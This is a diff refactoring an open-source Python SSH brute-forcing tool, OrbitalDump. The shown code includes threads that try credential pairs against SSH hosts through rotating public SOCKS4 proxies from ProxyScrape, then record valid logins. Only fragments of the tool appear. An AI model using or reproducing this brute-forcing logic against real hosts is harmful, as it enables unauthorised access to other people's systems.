@@ -1,15 +1,29 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
+Copyright (C) 2021-2022 K4YT3X and contributors.
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU Affero General Public License as
+published by the Free Software Foundation, either version 3 of the
+License, or (at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+GNU Affero General Public License for more details.
+
+You should have received a copy of the GNU Affero General Public License
+along with this program. If not, see <https://www.gnu.org/licenses/>.
+
 Name: OrbitalDump
 Author: K4YT3X
 Date Created: June 6, 2021
-Last Modified: July 5, 2021
+Last Modified: April 17, 2022
 
 A simple multi-threaded distributed SSH brute-forcing tool written in Python.
 """
 
-# built-in imports
 import argparse
 import collections
 import logging
@@ -20,11 +34,17 @@ import sys
 import threading
 import time
 
-# third-party imports
-from loguru import logger
 import paramiko
 import requests
 import socks
+from loguru import logger
+
+# format string for Loguru loggers
+LOGURU_FORMAT = (
+    "<green>{time:HH:mm:ss.SSSSSS!UTC}</green> | "
+    "<level>{level: <8}</level> | "
+    "<level>{message}</level>"
+)
 
 
 class SshBruteForcer(threading.Thread):
@@ -45,6 +65,7 @@ class SshBruteForcer(threading.Thread):
         self.jobs = jobs
         self.valid_credentials = valid_credentials
         self.proxies = proxies
+        self.running = False
 
     def run(self):
         self.running = True
@@ -85,6 +106,13 @@ class SshBruteForcer(threading.Thread):
                     sock=sock,
                 )
 
+            # authentication failure (wrong password)
+            except paramiko.AuthenticationException:
+                logger.info(
+                    f"(queue size: {self.jobs.qsize()}) Invalid credential: "
+                    f"{username}@{hostname}:{port}:{password}"
+                )
+
             # connection timeout
             except (
                 socket.timeout,
@@ -93,26 +121,23 @@ class SshBruteForcer(threading.Thread):
                 paramiko.SSHException,
             ):
                 logger.debug(
-                    f"(queue size: {self.jobs.qsize()}) Connection error: {username}@{hostname}:{port}:{password}"
+                    f"(queue size: {self.jobs.qsize()}) Connection error: "
+                    f"{username}@{hostname}:{port}:{password}"
                 )
                 self.jobs.put((hostname, username, password, port, timeout))
 
-            # authentication failure (wrong password)
-            except paramiko.AuthenticationException:
-                logger.info(
-                    f"(queue size: {self.jobs.qsize()}) Invalid credential: {username}@{hostname}:{port}:{password}"
-                )
-
             # other uncaught exceptions
-            except Exception as e:
+            except Exception as error:
                 logger.error(
-                    f"(queue size: {self.jobs.qsize()}) Uncaught exception {e}:  {username}@{hostname}:{port}:{password}"
+                    f"(queue size: {self.jobs.qsize()}) Uncaught exception {error}: "
+                    f"{username}@{hostname}:{port}:{password}"
                 )
 
             # login successful
             else:
                 logger.success(
-                    f"(queue size: {self.jobs.qsize()}) Valid credential found: {username}@{hostname}:{port}:{password}"
+                    f"(queue size: {self.jobs.qsize()}) Valid credential found: "
+                    f"{username}@{hostname}:{port}:{password}"
                 )
                 self.valid_credentials.append(
                     (hostname, username, password, port, timeout)
@@ -175,7 +200,8 @@ def get_proxies() -> collections.deque:
     """
     logger.info("Retrieving SOCKS4 proxies from ProxyScrape")
     proxies_request = requests.get(
-        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"
+        "https://api.proxyscrape.com/v2/?request="
+        "getproxies&protocol=socks4&timeout=10000&country=all"
     )
 
     # if response status code is 200, return the list of retrieved proxies
@@ -186,23 +212,19 @@ def get_proxies() -> collections.deque:
 
     # requests failed to download the list of proxies, raise an exception
     else:
-        logger.critical("An error occured while retrieving a list of proxies")
+        logger.critical("An error occurred while retrieving a list of proxies")
         proxies_request.raise_for_status()
 
 
-def main():
+def main() -> int:
     # disable built-in logging so paramiko won't print tracebacks
     logging.basicConfig(level=logging.CRITICAL)
 
     # remove built-in logger sink
-    logger.remove(0)
+    logger.remove()
 
     # add custom logger sink
-    logger.add(
-        sys.stderr,
-        colorize=True,
-        format="<fg 240>{time:HH:mm:ss.SSSSSS!UTC}</fg 240> | <level>{level: <8}</level> | <level>{message}</level>",
-    )
+    logger.add(sys.stderr, colorize=True, format=LOGURU_FORMAT)
 
     try:
         # parse command line arguments
@@ -215,8 +237,8 @@ def main():
             assert args.password.is_file(), "password file does not exist"
             assert args.port >= 0, "the port number must >= 0"
             assert args.timeout >= 0, "timeout must >= 0"
-        except AssertionError as e:
-            logger.error(e)
+        except AssertionError as error:
+            logger.error(error)
             sys.exit(1)
 
         # initialize variables
@@ -284,11 +306,13 @@ def main():
         for hostname, username, password, port, timeout in valid_credentials:
             print(f"{username}@{hostname}:{port}:{password}")
 
-    except Exception as e:
-        logger.exception(e)
-        sys.exit(1)
+        return 0
+
+    except Exception as error:
+        logger.exception(error)
+        return 1
 
 
 # launch the main function if this file is ran directly
 if __name__ == "__main__":
-    main()
+    sys.exit(main())
